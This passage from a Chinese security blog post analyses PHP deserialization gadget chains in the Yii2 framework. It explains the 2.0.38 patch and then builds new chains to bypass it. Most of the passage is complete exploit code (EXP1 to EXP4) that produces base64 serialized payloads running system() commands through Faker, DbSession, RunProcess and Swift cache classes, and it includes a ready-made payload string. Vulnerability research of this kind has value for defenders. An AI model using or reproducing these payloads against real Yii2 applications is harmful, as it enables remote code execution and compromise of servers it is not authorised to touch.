src="http://image.v0w.top/Blog/2020-09-22-203016.jpg"></p><p>对象销毁的时候，会调用<code>reset()</code>方法，函数中的<code>$this-&gt;_dataReader</code>变量可控。而这个变量调用了<code>close()</code>函数，这个函数在类中不存在，因此可以触发<code>__call</code>魔术方法，接下来就是要寻找可利用的点。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-205420.jpg"></p><p>通过搜索功能可以很容易的找到很多利用点，<strong>米斯特安全团队</strong>在复现时使用的是<code>Faker\Generator类/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">$formatter, $arguments = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $attributes</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $formatter</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Callable</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params">$formatter</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这个类的<code>__call()</code>方法会调用<code>format()</code>方法，</p><p><code>format()</code>方法通过<code>getFormatter($formatter)</code>方法获取参数，传入<code>call_user_func_array</code>。</p><p>因为<code>this-&gt;$formatters</code>我们可控，可以继续去调用任意类任意方法。</p><p>但是<code>$arguments</code>是从<code>yii\db\BatchQueryResult::reset()</code>里传过来的，我们<strong>不可控</strong>(为空)，所以我们只能<strong>不带参数</strong>地去调用别的类中的方法。</p><p>目前<code>$formatter=&#39;close&#39;</code>,<code>$arguments</code>为空，<code>this-&gt;formatters</code>可控。</p><p>那我们会想因为需要不带参数调用其他类的方法，那么这时需要的方法一定要满足两个条件：</p><ol><li>方法所需的参数只能是其自己类中存在的（即参数：<code>$this-&gt;args</code>）</li><li>方法需要有命令执行功能</li></ol><p><strong>米斯特团队</strong>是通过<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>的正则来查找到两个方法比较合适：</p><ol><li><code>yii\rest\CreateAction::run()</code></li><li><code>\yii\rest\IndexAction::run()</code></li></ol><p><img src="http://image.v0w.top/Blog/2020-09-22-232801.jpg"></p><p><code>/vendor/yiisoft/yii2/rest/IndexAction.php::run()</code>中的<code>$this-&gt;checkAccess, $this-&gt;id</code>都是可控的。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-233803.jpg"></p><p><code>/vendor/yiisoft/yii2/rest/CreateAction.php::run()</code>中的<code>$this-&gt;checkAccess, $this-&gt;id</code>都是可控的。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-233930.jpg"></p><p>通过这两个函数都可以执行。</p><p>于是构造了完整的POP链：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP1:</span><br><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p>完整的POP链有了之后，EXP的编写就相对简单了：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//EXP1:BatchQueryResult -&gt;...-&gt; __call()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//reset方法里又调用了close()方法:$this-&gt;_dataReader-&gt;close();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line"> <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-23-142928.jpg"></p><h2 id="1-3-漏洞修复"><a href="#1-3-漏洞修复" class="headerlink" title="1.3 漏洞修复"></a>1.3 漏洞修复</h2><p>Yii 2.0.38版本修复该漏洞，那么他是怎么修复的呢？</p><p><img src="http://image.v0w.top/Blog/2020-09-23-143418.png" alt="github compare"></p><p>可以看到就只是在<code>yii\db\BatchQueryResult</code>类里添加了一个<code>__wakeup</code>方法，</p><p><code>__wakeup</code>方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当<code>BatchQueryResult</code>类被反序列化时就直接报错，避免反序列化的发生，也就避免了该漏洞产生。</p><h1 id="0x02-通过不同的思路构造新的POP链"><a href="#0x02-通过不同的思路构造新的POP链" class="headerlink" title="0x02 通过不同的思路构造新的POP链"></a>0x02 通过不同的思路构造新的POP链</h1><p>我们除了可以通过<code>__call</code>方法，因为调用<code>close()</code>，我们还可以通过存在危险函数的<code>close()</code>方法的类，来进行RCE。</p><p><img src="http://image.v0w.top/Blog/2020-09-22-203016.jpg"></p><p>全局查询<code>close函数</code>：<code>function close\(\)</code></p><p><img src="http://image.v0w.top/Blog/2020-09-23-221606.jpg"></p><p>看了一圈，发现<code>\yii\web\DbSession::close</code>存在危险函数且参数可控。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web/DbSession.php::line146</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;getIsActive()) &#123;</span><br><span class="line">            <span class="comment">// prepare writeCallback fields before session closes</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;fields = <span class="keyword">$this</span>-&gt;composeFields();</span><br><span class="line">            YII_DEBUG ? session_write_close() : @session_write_close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>$this-&gt;composeFields()</code>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web/MultiFieldSession.php::line 96</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">composeFields</span>(<span class="params">$id = <span class="literal">null</span>, $data = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fields = <span class="keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="keyword">$this</span>-&gt;writeCallback, <span class="keyword">$this</span>) : [];</span><br><span class="line">        <span class="keyword">if</span> ($id !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $fields[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($data !== <span class="literal">null</span>) &#123;</span><br><span class="line">            $fields[<span class="string">&#x27;data&#x27;</span>] = $data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $fields;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>call_user_func</code>函数中的<code>$callback</code>参数支持已实例化的对象作为数组传递：</p><p><a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p><blockquote><p><strong>Callback / Callable 类型</strong></p><p>PHP是将函数以<a href="https://www.php.net/manual/zh/language.types.string.php">string</a>形式传递的。 可以使用任何内置或用户自定义函数，但除了语言结构例如：<a href="https://www.php.net/manual/zh/function.array.php">array()</a>，<a href="https://www.php.net/manual/zh/function.echo.php">echo</a>，<a href="https://www.php.net/manual/zh/function.empty.php">empty()</a>，<a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>，<a href="https://www.php.net/manual/zh/function.exit.php">exit()</a>，<a href="https://www.php.net/manual/zh/function.isset.php">isset()</a>，<a href="https://www.php.net/manual/zh/function.list.php">list()</a>，<a href="https://www.php.net/manual/zh/function.print.php">print</a> 或 <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a>。</p><p>一个已实例化的 <a href="https://www.php.net/manual/zh/language.types.object.php">object</a> 的方法被作为 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 传递，下标 0 包含该 <a href="https://www.php.net/manual/zh/language.types.object.php">object</a>，下标 1 包含方法名。 在同一个类里可以访问 protected 和 private 方法。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP2：</span><br><span class="line">yii\db\BatchQueryResult::__destruct()-&gt;reset()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\web\DbSession::close -&gt; MultiFieldSession::composeFields -&gt; call_user_func($this-&gt;writeCallback, $this)</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP2</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP2: BatchQueryResult -&gt; DbSession::close -&gt; call_user_func -&gt; IndexAction</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">payload</span> = <span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>();</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($payload));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $writeCallback;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-新版本2-0-38下的反序列化"><a href="#0x03-新版本2-0-38下的反序列化" class="headerlink" title="0x03 新版本2.0.38下的反序列化"></a>0x03 新版本2.0.38下的反序列化</h1><p>从上面的修复方案不难看出，新版本2.0.38修复了<code>BatchQueryResult</code>类的反序列化问题，那么是否存在其他的类可以反序列化呢？于是开始下面的尝试。</p><p>首先我们需要明确思路：</p><ul><li><strong>通过不同的触发点来绕过新版本的Patch。</strong>因为新版本的patch只是打在了<code>BatchQueryResult</code>这个触发点的类中，如果存在其他的类有触发点，那么问题就可以迎刃而解。</li></ul><p>首先查找一下比较常见的反序列化触发点：<code>function __destruct()|__wakeup()</code></p><p><img src="http://image.v0w.top/Blog/2020-09-23-151911.jpg"></p><p>也不是很多，可以挨个看一下，应该会有一些发现的。我将全部的都看了一遍，然后把可以利用的类，构造EXP。不可以利用的类，说明原因。</p><h2 id="3-1-EXP3："><a href="#3-1-EXP3：" class="headerlink" title="3.1 EXP3："></a>3.1 EXP3：</h2><p><code>vendor/codeception/codeception/ext/RunProcess.php:93</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stopProcess();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> $process) &#123;</span><br><span class="line">            <span class="comment">/** <span class="doctag">@var</span> $process Process  **/</span></span><br><span class="line">            <span class="keyword">if</span> (!$process-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . $process-&gt;getCommandLine());</span><br><span class="line">            $process-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>析构的时候，调用<code>stopProcess()</code>，而函数中的<code>this-&gt;processes</code>可控，也就意味着<code>$process</code>可控。而因为<code>$process</code>调用<code>isRunning()</code>函数进行判断，这个不在类中，会触发<code>__call()</code>方法。</p><p>至于后面的嘛，就可以接上第一条利用链POP1的<code>__call()</code>方法开头的后半段，完成一个新的POP链：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP3:</span><br><span class="line">\Codeception\Extension\RunProcess::__destruct()-&gt;stopProcess()-&gt;$process-&gt;isRunning()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run-&gt;call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP3</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP3: RunProcess -&gt; ... -&gt; __call()</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;           <span class="comment">//command</span></span><br><span class="line">            <span class="comment">// run() -&gt; call_user_func($this-&gt;checkAccess, $this-&gt;id);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> IndexAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">            <span class="comment">//stopProcess方法里又调用了isRunning()方法: $process-&gt;isRunning()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $processes;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-09-23-163935.jpg"></p><h2 id="3-2-EXP4"><a href="#3-2-EXP4" class="headerlink" title="3.2 EXP4"></a>3.2 EXP4</h2><p><code>\Swift_KeyCache_DiskKeyCache::__destruct</code>调用<code>clearAll</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys <span class="keyword">as</span> $nsKey =&gt; $null) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearAll($nsKey);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进到<code>clearAll()</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearAll</span>(<span class="params">$nsKey</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($nsKey, <span class="keyword">$this</span>-&gt;keys)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;keys[$nsKey] <span class="keyword">as</span> $itemKey =&gt; $null) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearKey($nsKey, $itemKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey)) &#123;</span><br><span class="line">            rmdir(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;keys[$nsKey]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>clearKey</code>:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearKey</span>(<span class="params">$nsKey, $itemKey</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasKey($nsKey, $itemKey)) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;freeHandle($nsKey, $itemKey);</span><br><span class="line">           unlink(<span class="keyword">$this</span>-&gt;path.<span class="string">&#x27;/&#x27;</span>.$nsKey.<span class="string">&#x27;/&#x27;</span>.$itemKey);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里的<code>unlink</code>用到了拼接字符串，而<code>this-&gt;path</code>可控，所以就调用<code>__toString()</code>方法：</p><blockquote><p><code>__toString</code> 当一个对象被当做字符串使用时被调用</p></blockquote><p>接下来需要找到可以利用的<code>__toString()</code>魔术方法来触发后续操作。</p><p>全局搜索一下<code>__toString()</code>方法：<code>function __toString\(\)</code></p><p>可以发现不少的方法，接下来最好找一些<strong>调用其他类函数</strong>的<code>__toString</code></p><p>比如我找了几个：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\Codeception\Util\XmlBuilder::__toString -&gt; \DOMDocument::saveXML 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Deprecated::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Generic::__toString -&gt; render 可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\See::__toString -&gt; render可以触发__call方法</span><br><span class="line"></span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Link::__toString -&gt; render</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>以<code>\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString</code>为例，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;refers . (<span class="keyword">$this</span>-&gt;description ? <span class="string">&#x27; &#x27;</span> . <span class="keyword">$this</span>-&gt;description-&gt;render() : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>$this-&gt;refers</code>和<code>$this-&gt;description</code>可控。同时它在调用<code>render()</code>时会调用<code>__call</code>魔术方法。</p><p>之后就与POP1的后半段链一样了。</p><p>完整的POP链如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POP4:</span><br><span class="line">\Swift_KeyCache_DiskKeyCache::__destruct -&gt; clearAll -&gt; clearKey -&gt; __toString</span><br><span class="line">-&gt; </span><br><span class="line">\phpDocumentor\Reflection\DocBlock\Tags\Covers::__toString -&gt; render</span><br><span class="line">-&gt; </span><br><span class="line">Faker\Generator::__call()-&gt;format() -&gt; call_user_func_array()</span><br><span class="line">-&gt;</span><br><span class="line">\yii\rest\IndexAction::run -&gt; call_user_func()</span><br></pre></td></tr></table></figure><p><strong>EXP4</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// EXP: Swift_KeyCache_DiskKeyCache::__destruct -&gt; __toString -&gt; __call</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Covers</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span 